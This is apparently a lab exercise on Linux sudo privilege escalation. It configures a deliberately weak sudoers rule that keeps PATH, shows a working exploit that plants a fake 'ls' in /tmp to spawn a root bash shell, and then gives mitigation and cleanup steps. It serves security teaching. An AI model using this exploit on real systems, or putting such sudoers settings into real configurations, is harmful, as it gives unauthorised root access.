# Setup

```sh
# root
cp /etc/sudoers /etc/sudoers.bak
adduser attacker
echo "attacker ALL=(ALL) NOPASSWD: /home/attacker/script.sh" >> /etc/sudoers
echo "Defaults env_keep += PATH" >> /etc/sudoers
echo 'ls -la' > /home/attacker/script.sh
```

# Exploit

```bash
echo '/bin/bash' > /tmp/ls

sudo PATH=/tmp/:$PATH /home/attacker/script.sh
```


# Mitigate

```bash
# Remove env_keep += PATH
# Set secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

# Clean Up

```bash
deluser attacker --remove-home
cp /etc/sudoers.bak /etc/sudoers
```